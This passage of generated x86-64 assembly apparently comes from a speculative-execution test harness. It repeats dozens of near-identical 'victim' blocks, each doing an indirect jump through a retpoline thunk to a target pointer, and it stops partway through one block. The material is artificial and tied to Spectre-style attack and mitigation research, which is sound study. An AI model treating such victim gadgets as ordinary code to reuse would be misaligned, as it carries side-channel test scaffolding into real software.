.Lgg_retpol_thunk_000365:
	callq	.Lgg_retpol_setup_000365
.Lgg_retpol_cap_000365:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000365
.Lgg_retpol_setup_000365:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000365:
	jmp	.Lvictim_win0_continue
## Variant 366
.Lvictim_win0_var366:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000366
	jmp	.Lgg_retpol_after_000366
.Lgg_retpol_thunk_000366:
	callq	.Lgg_retpol_setup_000366
.Lgg_retpol_cap_000366:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000366
.Lgg_retpol_setup_000366:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000366:
	jmp	.Lvictim_win0_continue
## Variant 367
.Lvictim_win0_var367:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000367
	jmp	.Lgg_retpol_after_000367
.Lgg_retpol_thunk_000367:
	callq	.Lgg_retpol_setup_000367
.Lgg_retpol_cap_000367:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000367
.Lgg_retpol_setup_000367:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000367:
	jmp	.Lvictim_win0_continue
## Variant 368
.Lvictim_win0_var368:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000368
	jmp	.Lgg_retpol_after_000368
.Lgg_retpol_thunk_000368:
	callq	.Lgg_retpol_setup_000368
.Lgg_retpol_cap_000368:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000368
.Lgg_retpol_setup_000368:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000368:
	jmp	.Lvictim_win0_continue
## Variant 369
.Lvictim_win0_var369:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000369
	jmp	.Lgg_retpol_after_000369
.Lgg_retpol_thunk_000369:
	callq	.Lgg_retpol_setup_000369
.Lgg_retpol_cap_000369:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000369
.Lgg_retpol_setup_000369:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000369:
	jmp	.Lvictim_win0_continue
## Variant 370
.Lvictim_win0_var370:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000370
	jmp	.Lgg_retpol_after_000370
.Lgg_retpol_thunk_000370:
	callq	.Lgg_retpol_setup_000370
.Lgg_retpol_cap_000370:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000370
.Lgg_retpol_setup_000370:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000370:
	jmp	.Lvictim_win0_continue
## Variant 371
.Lvictim_win0_var371:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000371
	jmp	.Lgg_retpol_after_000371
.Lgg_retpol_thunk_000371:
	callq	.Lgg_retpol_setup_000371
.Lgg_retpol_cap_000371:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000371
.Lgg_retpol_setup_000371:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000371:
	jmp	.Lvictim_win0_continue
## Variant 372
.Lvictim_win0_var372:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000372
	jmp	.Lgg_retpol_after_000372
.Lgg_retpol_thunk_000372:
	callq	.Lgg_retpol_setup_000372
.Lgg_retpol_cap_000372:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000372
.Lgg_retpol_setup_000372:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000372:
	jmp	.Lvictim_win0_continue
## Variant 373
.Lvictim_win0_var373:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000373
	jmp	.Lgg_retpol_after_000373
.Lgg_retpol_thunk_000373:
	callq	.Lgg_retpol_setup_000373
.Lgg_retpol_cap_000373:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000373
.Lgg_retpol_setup_000373:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000373:
	jmp	.Lvictim_win0_continue
## Variant 374
.Lvictim_win0_var374:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000374
	jmp	.Lgg_retpol_after_000374
.Lgg_retpol_thunk_000374:
	callq	.Lgg_retpol_setup_000374
.Lgg_retpol_cap_000374:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000374
.Lgg_retpol_setup_000374:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000374:
	jmp	.Lvictim_win0_continue
## Variant 375
.Lvictim_win0_var375:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000375
	jmp	.Lgg_retpol_after_000375
.Lgg_retpol_thunk_000375:
	callq	.Lgg_retpol_setup_000375
.Lgg_retpol_cap_000375:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000375
.Lgg_retpol_setup_000375:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000375:
	jmp	.Lvictim_win0_continue
## Variant 376
.Lvictim_win0_var376:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000376
	jmp	.Lgg_retpol_after_000376
.Lgg_retpol_thunk_000376:
	callq	.Lgg_retpol_setup_000376
.Lgg_retpol_cap_000376:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000376
.Lgg_retpol_setup_000376:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000376:
	jmp	.Lvictim_win0_continue
## Variant 377
.Lvictim_win0_var377:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000377
	jmp	.Lgg_retpol_after_000377
.Lgg_retpol_thunk_000377:
	callq	.Lgg_retpol_setup_000377
.Lgg_retpol_cap_000377:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000377
.Lgg_retpol_setup_000377:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000377:
	jmp	.Lvictim_win0_continue
## Variant 378
.Lvictim_win0_var378:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000378
	jmp	.Lgg_retpol_after_000378
.Lgg_retpol_thunk_000378:
	callq	.Lgg_retpol_setup_000378
.Lgg_retpol_cap_000378:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000378
.Lgg_retpol_setup_000378:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000378:
	jmp	.Lvictim_win0_continue
## Variant 379
.Lvictim_win0_var379:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000379
	jmp	.Lgg_retpol_after_000379
.Lgg_retpol_thunk_000379:
	callq	.Lgg_retpol_setup_000379
.Lgg_retpol_cap_000379:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000379
.Lgg_retpol_setup_000379:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000379:
	jmp	.Lvictim_win0_continue
## Variant 380
.Lvictim_win0_var380:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000380
	jmp	.Lgg_retpol_after_000380
.Lgg_retpol_thunk_000380:
	callq	.Lgg_retpol_setup_000380
.Lgg_retpol_cap_000380:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000380
.Lgg_retpol_setup_000380:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000380:
	jmp	.Lvictim_win0_continue
## Variant 381
.Lvictim_win0_var381:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000381
	jmp	.Lgg_retpol_after_000381
.Lgg_retpol_thunk_000381:
	callq	.Lgg_retpol_setup_000381
.Lgg_retpol_cap_000381:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000381
.Lgg_retpol_setup_000381:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000381:
	jmp	.Lvictim_win0_continue
## Variant 382
.Lvictim_win0_var382:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000382
	jmp	.Lgg_retpol_after_000382
.Lgg_retpol_thunk_000382:
	callq	.Lgg_retpol_setup_000382
.Lgg_retpol_cap_000382:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000382
.Lgg_retpol_setup_000382:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000382:
	jmp	.Lvictim_win0_continue
## Variant 383
.Lvictim_win0_var383:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000383
	jmp	.Lgg_retpol_after_000383
.Lgg_retpol_thunk_000383:
	callq	.Lgg_retpol_setup_000383
.Lgg_retpol_cap_000383:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000383
.Lgg_retpol_setup_000383:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000383:
	jmp	.Lvictim_win0_continue
## Variant 384
.Lvictim_win0_var384:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000384
	jmp	.Lgg_retpol_after_000384
.Lgg_retpol_thunk_000384:
	callq	.Lgg_retpol_setup_000384
.Lgg_retpol_cap_000384:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000384
.Lgg_retpol_setup_000384:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000384:
	jmp	.Lvictim_win0_continue
## Variant 385
.Lvictim_win0_var385:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000385
	jmp	.Lgg_retpol_after_000385
.Lgg_retpol_thunk_000385:
	callq	.Lgg_retpol_setup_000385
.Lgg_retpol_cap_000385:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000385
.Lgg_retpol_setup_000385:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000385:
	jmp	.Lvictim_win0_continue
## Variant 386
.Lvictim_win0_var386:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000386
	jmp	.Lgg_retpol_after_000386
.Lgg_retpol_thunk_000386:
	callq	.Lgg_retpol_setup_000386
.Lgg_retpol_cap_000386:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000386
.Lgg_retpol_setup_000386:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000386:
	jmp	.Lvictim_win0_continue
## Variant 387
.Lvictim_win0_var387:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000387
	jmp	.Lgg_retpol_after_000387
.Lgg_retpol_thunk_000387:
	callq	.Lgg_retpol_setup_000387
.Lgg_retpol_cap_000387:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000387
.Lgg_retpol_setup_000387:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000387:
	jmp	.Lvictim_win0_continue
## Variant 388
.Lvictim_win0_var388:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000388
	jmp	.Lgg_retpol_after_000388
.Lgg_retpol_thunk_000388:
	callq	.Lgg_retpol_setup_000388
.Lgg_retpol_cap_000388:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000388
.Lgg_retpol_setup_000388:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000388:
	jmp	.Lvictim_win0_continue
## Variant 389
.Lvictim_win0_var389:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000389
	jmp	.Lgg_retpol_after_000389
.Lgg_retpol_thunk_000389:
	callq	.Lgg_retpol_setup_000389
.Lgg_retpol_cap_000389:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000389
.Lgg_retpol_setup_000389:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000389:
	jmp	.Lvictim_win0_continue
## Variant 390
.Lvictim_win0_var390:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000390
	jmp	.Lgg_retpol_after_000390
.Lgg_retpol_thunk_000390:
	callq	.Lgg_retpol_setup_000390
.Lgg_retpol_cap_000390:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000390
.Lgg_retpol_setup_000390:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000390:
	jmp	.Lvictim_win0_continue
## Variant 391
.Lvictim_win0_var391:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000391
	jmp	.Lgg_retpol_after_000391
.Lgg_retpol_thunk_000391:
	callq	.Lgg_retpol_setup_000391
.Lgg_retpol_cap_000391:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000391
.Lgg_retpol_setup_000391:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000391:
	jmp	.Lvictim_win0_continue
## Variant 392
.Lvictim_win0_var392:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000392
	jmp	.Lgg_retpol_after_000392
.Lgg_retpol_thunk_000392:
	callq	.Lgg_retpol_setup_000392
.Lgg_retpol_cap_000392:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000392
.Lgg_retpol_setup_000392:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000392:
	jmp	.Lvictim_win0_continue
## Variant 393
.Lvictim_win0_var393:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000393
	jmp	.Lgg_retpol_after_000393
.Lgg_retpol_thunk_000393:
	callq	.Lgg_retpol_setup_000393
.Lgg_retpol_cap_000393:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000393
.Lgg_retpol_setup_000393:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000393:
	jmp	.Lvictim_win0_continue
## Variant 394
.Lvictim_win0_var394:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000394
	jmp	.Lgg_retpol_after_000394
.Lgg_retpol_thunk_000394:
	callq	.Lgg_retpol_setup_000394
.Lgg_retpol_cap_000394:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000394
.Lgg_retpol_setup_000394:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000394:
	jmp	.Lvictim_win0_continue
## Variant 395
.Lvictim_win0_var395:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000395
	jmp	.Lgg_retpol_after_000395
.Lgg_retpol_thunk_000395:
	callq	.Lgg_retpol_setup_000395
.Lgg_retpol_cap_000395:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000395
.Lgg_retpol_setup_000395:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000395:
	jmp	.Lvictim_win0_continue
## Variant 396
.Lvictim_win0_var396:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000396
	jmp	.Lgg_retpol_after_000396
.Lgg_retpol_thunk_000396:
	callq	.Lgg_retpol_setup_000396
.Lgg_retpol_cap_000396:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000396
.Lgg_retpol_setup_000396:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000396:
	jmp	.Lvictim_win0_continue
## Variant 397
.Lvictim_win0_var397:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000397
	jmp	.Lgg_retpol_after_000397
.Lgg_retpol_thunk_000397:
	callq	.Lgg_retpol_setup_000397
.Lgg_retpol_cap_000397:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000397
.Lgg_retpol_setup_000397:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000397:
	jmp	.Lvictim_win0_continue
## Variant 398
.Lvictim_win0_var398:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000398
	jmp	.Lgg_retpol_after_000398
.Lgg_retpol_thunk_000398:
	callq	.Lgg_retpol_setup_000398
.Lgg_retpol_cap_000398:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000398
.Lgg_retpol_setup_000398:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000398:
	jmp	.Lvictim_win0_continue
## Variant 399
.Lvictim_win0_var399:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000399
	jmp	.Lgg_retpol_after_000399
.Lgg_retpol_thunk_000399:
	callq	.Lgg_retpol_setup_000399
.Lgg_retpol_cap_000399:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000399
.Lgg_retpol_setup_000399:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000399:
	jmp	.Lvictim_win0_continue
## Variant 400
.Lvictim_win0_var400:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000400
	jmp	.Lgg_retpol_after_000400
.Lgg_retpol_thunk_000400:
	callq	.Lgg_retpol_setup_000400
.Lgg_retpol_cap_000400:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000400
.Lgg_retpol_setup_000400:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000400:
	jmp	.Lvictim_win0_continue
## Variant 401
.Lvictim_win0_var401:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000401
	jmp	.Lgg_retpol_after_000401
.Lgg_retpol_thunk_000401:
	callq	.Lgg_retpol_setup_000401
.Lgg_retpol_cap_000401:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000401
.Lgg_retpol_setup_000401:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000401:
	jmp	.Lvictim_win0_continue
## Variant 402
.Lvictim_win0_var402:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000402
	jmp	.Lgg_retpol_after_000402
.Lgg_retpol_thunk_000402:
	callq	.Lgg_retpol_setup_000402
.Lgg_retpol_cap_000402:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000402
.Lgg_retpol_setup_000402:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000402:
	jmp	.Lvictim_win0_continue
## Variant 403
.Lvictim_win0_var403:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000403
	jmp	.Lgg_retpol_after_000403
.Lgg_retpol_thunk_000403:
	callq	.Lgg_retpol_setup_000403
.Lgg_retpol_cap_000403:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000403
.Lgg_retpol_setup_000403:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000403:
	jmp	.Lvictim_win0_continue
## Variant 404
.Lvictim_win0_var404:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000404
	jmp	.Lgg_retpol_after_000404
.Lgg_retpol_thunk_000404:
	callq	.Lgg_retpol_setup_000404
.Lgg_retpol_cap_000404:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000404
.Lgg_retpol_setup_000404:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000404:
	jmp	.Lvictim_win0_continue
## Variant 405
.Lvictim_win0_var405:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000405
	jmp	.Lgg_retpol_after_000405
.Lgg_retpol_thunk_000405:
	callq	.Lgg_retpol_setup_000405
.Lgg_retpol_cap_000405:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000405
.Lgg_retpol_setup_000405:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000405:
	jmp	.Lvictim_win0_continue
## Variant 406
.Lvictim_win0_var406:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000406
	jmp	.Lgg_retpol_after_000406
.Lgg_retpol_thunk_000406:
	callq	.Lgg_retpol_setup_000406
.Lgg_retpol_cap_000406:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000406
.Lgg_retpol_setup_000406:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000406:
	jmp	.Lvictim_win0_continue
## Variant 407
.Lvictim_win0_var407:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000407
	jmp	.Lgg_retpol_after_000407
.Lgg_retpol_thunk_000407:
	callq	.Lgg_retpol_setup_000407
.Lgg_retpol_cap_000407:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000407
.Lgg_retpol_setup_000407:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000407:
	jmp	.Lvictim_win0_continue
## Variant 408
.Lvictim_win0_var408:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000408
	jmp	.Lgg_retpol_after_000408
.Lgg_retpol_thunk_000408:
	callq	.Lgg_retpol_setup_000408
.Lgg_retpol_cap_000408:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000408
.Lgg_retpol_setup_000408:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000408:
	jmp	.Lvictim_win0_continue
## Variant 409
.Lvictim_win0_var409:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000409
	jmp	.Lgg_retpol_after_000409
.Lgg_retpol_thunk_000409:
	callq	.Lgg_retpol_setup_000409
.Lgg_retpol_cap_000409:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000409
.Lgg_retpol_setup_000409:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000409:
	jmp	.Lvictim_win0_continue
## Variant 410
.Lvictim_win0_var410:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000410
	jmp	.Lgg_retpol_after_000410
.Lgg_retpol_thunk_000410:
	callq	.Lgg_retpol_setup_000410
.Lgg_retpol_cap_000410:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000410
.Lgg_retpol_setup_000410:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000410:
	jmp	.Lvictim_win0_continue
## Variant 411
.Lvictim_win0_var411:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000411
	jmp	.Lgg_retpol_after_000411
.Lgg_retpol_thunk_000411:
	callq	.Lgg_retpol_setup_000411
.Lgg_retpol_cap_000411:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000411
.Lgg_retpol_setup_000411:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000411:
	jmp	.Lvictim_win0_continue
## Variant 412
.Lvictim_win0_var412:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000412
	jmp	.Lgg_retpol_after_000412
.Lgg_retpol_thunk_000412:
	callq	.Lgg_retpol_setup_000412
.Lgg_retpol_cap_000412:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000412
.Lgg_retpol_setup_000412:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000412:
	jmp	.Lvictim_win0_continue
## Variant 413
.Lvictim_win0_var413:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000413
	jmp	.Lgg_retpol_after_000413
.Lgg_retpol_thunk_000413:
	callq	.Lgg_retpol_setup_000413
.Lgg_retpol_cap_000413:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000413
.Lgg_retpol_setup_000413:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000413:
	jmp	.Lvictim_win0_continue
## Variant 414
.Lvictim_win0_var414:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000414
	jmp	.Lgg_retpol_after_000414
.Lgg_retpol_thunk_000414:
	callq	.Lgg_retpol_setup_000414
.Lgg_retpol_cap_000414:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000414
.Lgg_retpol_setup_000414:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000414:
	jmp	.Lvictim_win0_continue
## Variant 415
.Lvictim_win0_var415:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000415
	jmp	.Lgg_retpol_after_000415
.Lgg_retpol_thunk_000415:
	callq	.Lgg_retpol_setup_000415
.Lgg_retpol_cap_000415:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000415
.Lgg_retpol_setup_000415:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000415:
	jmp	.Lvictim_win0_continue
## Variant 416
.Lvictim_win0_var416:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000416
	jmp	.Lgg_retpol_after_000416
.Lgg_retpol_thunk_000416:
	callq	.Lgg_retpol_setup_000416
.Lgg_retpol_cap_000416:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000416
.Lgg_retpol_setup_000416:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000416:
	jmp	.Lvictim_win0_continue
## Variant 417
.Lvictim_win0_var417:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000417
	jmp	.Lgg_retpol_after_000417
.Lgg_retpol_thunk_000417:
	callq	.Lgg_retpol_setup_000417
.Lgg_retpol_cap_000417:
	pause
	lfence
